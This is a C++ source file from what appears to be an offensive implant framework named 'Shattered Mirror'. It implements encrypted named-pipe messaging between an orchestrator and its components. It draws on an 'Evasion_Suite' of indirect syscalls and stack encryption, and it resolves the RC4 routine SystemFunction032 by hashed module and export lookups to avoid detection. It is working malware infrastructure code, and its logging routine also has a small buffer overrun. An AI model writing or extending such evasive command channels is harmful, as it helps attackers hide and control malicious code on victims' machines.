/*=============================================================================
 * Shattered Mirror v1 — Orchestrator: IPC Channel (Encrypted Named Pipes)
 * FINAL: BYTE MODE restored for reliable ReadExactly/WriteExactly
 *===========================================================================*/

#include "../Evasion_Suite/include/indirect_syscall.h"
#include "../Evasion_Suite/include/stack_encrypt.h"
#include "AtomManager.h"
#include <cstdarg>
#include <cstdio>
#include "Config.h"

#define PIPE_NAME_FORMAT_REPORT L"\\\\.\\pipe\\SM_%08X_R"
#define PIPE_NAME_FORMAT_CMD L"\\\\.\\pipe\\SM_%08X_C"

static void IPCTrace(const char *format, ...) {
  if (!Config::LOGGING_ENABLED) return;
  char buf[512];
  va_list args;
  va_start(args, format);
  int len = vsnprintf(buf, sizeof(buf), format, args);
  va_end(args);
  
  if (len > 0 && len < sizeof(buf)) {
    buf[len] = '\n';
    buf[len + 1] = '\0';
    OutputDebugStringA(buf);
  }

  SYSTEMTIME st;
  GetLocalTime(&st);
  char timeStr[32];
  sprintf_s(timeStr, "[%02d:%02d:%02d.%03d]", st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);

  FILE *f = fopen("log\\ipc_debug.txt", "a");
  if (f) {
    fprintf(f, "%s %s\n", timeStr, buf);
    fclose(f);
  }

  // Dedicated Traffic Log for user's "time to time" request
  FILE *tf = fopen("log\\ipc_traffic.log", "a");
  if (tf) {
    fprintf(tf, "%s %s\n", timeStr, buf);
    fclose(tf);
  }
}

static BOOL XOR_Crypt(PVOID pBuffer, DWORD dwSize, BYTE *pKey, DWORD dwKeyLen) {
  if (!pBuffer || dwSize == 0 || !pKey || dwKeyLen == 0)
    return FALSE;
  BYTE *p = (BYTE *)pBuffer;
  for (DWORD i = 0; i < dwSize; i++)
    p[i] ^= pKey[i % dwKeyLen];
  return TRUE;
}

static BOOL RC4_Buffer(PVOID pBuffer, DWORD dwSize, BYTE *pKey,
                       DWORD dwKeyLen) {
  if (!pBuffer || dwSize == 0)
    return TRUE;
  static fnSystemFunction032 pSystemFunction032 = NULL;
  static BOOL bResolved = FALSE;
  if (!bResolved) {
    PVOID pAdvapi = GetModuleBaseByHash(HASH_ADVAPI32);
    if (pAdvapi)
      pSystemFunction032 = (fnSystemFunction032)GetExportByHash(
          pAdvapi, djb2_hash_ct("SystemFunction032"));
    bResolved = TRUE;
    IPCTrace("SystemFunction032 resolved: %p", pSystemFunction032);
  }
  if (pSystemFunction032) {
    USTRING data = {dwSize, dwSize, pBuffer};
    USTRING key = {dwKeyLen, dwKeyLen, pKey};
    NTSTATUS status = pSystemFunction032(&data, &key);
    if (NT_SUCCESS(status))
      return TRUE;
    IPCTrace("RC4 failed (0x%08X), falling back to XOR", status);
  } else {
    IPCTrace("SystemFunction032 not found, using XOR fallback.");
  }
  return XOR_Crypt(pBuffer, dwSize, pKey, dwKeyLen);
}

static BOOL ReadExactly(HANDLE hPipe, PVOID buffer, DWORD size) {
  BYTE *pb = (BYTE *)buffer;
  DWORD totalRead = 0;
  while (totalRead < size) {
    DWORD bytesRead = 0;
    if (!ReadFile(hPipe, pb + totalRead, size - totalRead, &bytesRead, NULL)) {
      IPCTrace("ReadFile failed at offset %lu/%lu, error=%lu", totalRead, size,
               GetLastError());
      return FALSE;
    }
    if (bytesRead == 0) {
      IPCTrace("ReadFile returned 0 bytes (EOF) at offset %lu/%lu", totalRead,
               size);
      return FALSE;
    }
    totalRead += bytesRead;
  }
  return TRUE;
}

static BOOL WriteExactly(HANDLE hPipe, const void *buffer, DWORD size) {
  const BYTE *pb = (const BYTE *)buffer;
  DWORD totalWritten = 0;
  while (totalWritten < size) {
    DWORD bytesWritten = 0;
    if (!WriteFile(hPipe, pb + totalWritten, size - totalWritten, &bytesWritten,
                   NULL)) {
      IPCTrace("WriteFile failed at offset %lu/%lu, error=%lu", totalWritten,
               size, GetLastError());
      return FALSE;
    }
    if (bytesWritten == 0) {
      IPCTrace("WriteFile returned 0 bytes at offset %lu/%lu", totalWritten,
               size);
      return FALSE;
    }
    totalWritten += bytesWritten;
  }
  return TRUE;
}

HANDLE IPC_CreateReportServerPipe(DWORD dwAtomId) {
  WCHAR szPipeName[128];
  wsprintfW(szPipeName, PIPE_NAME_FORMAT_REPORT, dwAtomId);
  HANDLE hPipe = CreateNamedPipeW(
      szPipeName, PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE,
      PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 65536,
      65536, 0, NULL);
  if (hPipe == INVALID_HANDLE_VALUE) {
    IPCTrace("CreateReportServerPipe(%lu) FAILED, error=%lu", dwAtomId,
             GetLastError());
    return NULL;
  }
  IPCTrace("CreateReportServerPipe(%lu) succeeded. Handle=%p", dwAtomId, hPipe);
  return hPipe;
}

HANDLE IPC_CreateCommandServerPipe(DWORD dwAtomId) {
  WCHAR szPipeName[128];
  wsprintfW(szPipeName, PIPE_NAME_FORMAT_CMD, dwAtomId);
  HANDLE hPipe = CreateNamedPipeW(
      szPipeName, PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE,
      PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 65536,
      65536, 0, NULL);
  if (hPipe == INVALID_HANDLE_VALUE) {
    IPCTrace("CreateCommandServerPipe(%lu) FAILED, error=%lu", dwAtomId,
             GetLastError());
    return NULL;
  }
  IPCTrace("CreateCommandServerPipe(%lu) succeeded. Handle=%p", dwAtomId,
           hPipe);
  return hPipe;
}

HANDLE IPC_ConnectToReportPipe(DWORD dwAtomId) {
  WCHAR szPipeName[128];
  wsprintfW(szPipeName, PIPE_NAME_FORMAT_REPORT, dwAtomId);
  HANDLE hPipe = INVALID_HANDLE_VALUE;
  int retries = 50;
  while (retries-- > 0) {
    if (WaitNamedPipeW(szPipeName, 100)) {
      hPipe = CreateFileW(szPipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL,
                          OPEN_EXISTING, 0, NULL);
      if (hPipe != INVALID_HANDLE_VALUE)
        break;
    }
    Sleep(100);
  }
  if (hPipe == INVALID_HANDLE_VALUE) {
    IPCTrace("ConnectToReportPipe(%lu) FAILED, error=%lu", dwAtomId,
             GetLastError());
    return NULL;
  }
  DWORD dwMode = PIPE_READMODE_BYTE;
  SetNamedPipeHandleState(hPipe, &dwMode, NULL, NULL);
  IPCTrace("ConnectToReportPipe(%lu) succeeded. Handle=%p", dwAtomId, hPipe);
  return hPipe;
}

HANDLE IPC_ConnectToCommandPipe(DWORD dwAtomId) {
  WCHAR szPipeName[128];
  wsprintfW(szPipeName, PIPE_NAME_FORMAT_CMD, dwAtomId);
  HANDLE hPipe = INVALID_HANDLE_VALUE;
  int retries = 50;
  while (retries-- > 0) {
    if (WaitNamedPipeW(szPipeName, 100)) {
      hPipe = CreateFileW(szPipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL,
                          OPEN_EXISTING, 0, NULL);
      if (hPipe != INVALID_HANDLE_VALUE)
        break;
    }
    Sleep(100);
  }
  if (hPipe == INVALID_HANDLE_VALUE) {
    IPCTrace("ConnectToCommandPipe(%lu) FAILED, error=%lu", dwAtomId,
             GetLastError());
    return NULL;
  }
  DWORD dwMode = PIPE_READMODE_BYTE;
  SetNamedPipeHandleState(hPipe, &dwMode, NULL, NULL);
  IPCTrace("ConnectToCommandPipe(%lu) succeeded. Handle=%p", dwAtomId, hPipe);
  return hPipe;
}

BOOL IPC_SendMessage(HANDLE hPipe, PIPC_MESSAGE pMsg, BYTE *pEncKey,
                     DWORD dwKeyLen) {
  if (!hPipe || !pMsg || !pEncKey)
    return FALSE;
  pMsg->dwSignature = 0x534D4952;
  if (pMsg->dwPayloadLen > MAX_IPC_PAYLOAD_SIZE)
    pMsg->dwPayloadLen = MAX_IPC_PAYLOAD_SIZE;
  DWORD dwTotalSize = 16 + pMsg->dwPayloadLen;
  if (pMsg->dwPayloadLen > 0) {
    if (!RC4_Buffer(pMsg->Payload, pMsg->dwPayloadLen, pEncKey, dwKeyLen))
      return FALSE;
  }
  IPCTrace("[TRAFFIC] SEND_START | Pipe=%p | Cmd=%d | Payload=%lu",
           hPipe, pMsg->CommandId, pMsg->dwPayloadLen);
  ULONGLONG start = GetTickCount64();
  BOOL bSuccess = WriteExactly(hPipe, pMsg, dwTotalSize);
  ULONGLONG end = GetTickCount64();
  DWORD err = GetLastError();

  if (pMsg->dwPayloadLen > 0)
    RC4_Buffer(pMsg->Payload, pMsg->dwPayloadLen, pEncKey, dwKeyLen);

  if (!bSuccess) {
    IPCTrace("[TRAFFIC] SEND_FAIL | Pipe=%p | Duration=%llums | Error=%lu", 
             hPipe, end - start, err);
    return FALSE;
  }
  IPCTrace("[TRAFFIC] SEND_COMPLETE | Pipe=%p | Duration=%llums",
           hPipe, end - start);
  return TRUE;
}

BOOL IPC_ReceiveMessage(HANDLE hPipe, PIPC_MESSAGE pMsg, BYTE *pEncKey,
                        DWORD dwKeyLen) {
  if (!hPipe || !pMsg || !pEncKey)
    return FALSE;
  IPCTrace("[TRAFFIC] RECV_START | Pipe=%p | Waiting for header...", hPipe);
  ULONGLONG start = GetTickCount64();
  if (!ReadExactly(hPipe, pMsg, 16)) {
    IPCTrace("[TRAFFIC] RECV_FAIL_HEADER | Pipe=%p | Error=%lu",
             hPipe, GetLastError());
    return FALSE;
  }
  if (pMsg->dwSignature != 0x534D4952) {
    IPCTrace("[TRAFFIC] RECV_INVALID_SIG | Pipe=%p | Sig=0x%08X",
             hPipe, pMsg->dwSignature);
    return FALSE;
  }
  if (pMsg->dwPayloadLen > MAX_IPC_PAYLOAD_SIZE) {
    IPCTrace("[TRAFFIC] RECV_OVERSIZE | Pipe=%p | Size=%lu",
             hPipe, pMsg->dwPayloadLen);
    return FALSE;
  }
  if (pMsg->dwPayloadLen > 0) {
    if (!ReadExactly(hPipe, pMsg->Payload, pMsg->dwPayloadLen)) {
      IPCTrace("[TRAFFIC] RECV_FAIL_PAYLOAD | Pipe=%p | Size=%lu",
               hPipe, pMsg->dwPayloadLen);
      return FALSE;
    }
    if (!RC4_Buffer(pMsg->Payload, pMsg->dwPayloadLen, pEncKey, dwKeyLen)) {
      IPCTrace("[TRAFFIC] RECV_CRYPT_FAIL | Pipe=%p", hPipe);
      return FALSE;
    }
  }
  ULONGLONG end = GetTickCount64();
  IPCTrace("[TRAFFIC] RECV_COMPLETE | Pipe=%p | Cmd=%d | Size=%lu | Duration=%llums",
           hPipe, pMsg->CommandId, pMsg->dwPayloadLen, end - start);
  return TRUE;
}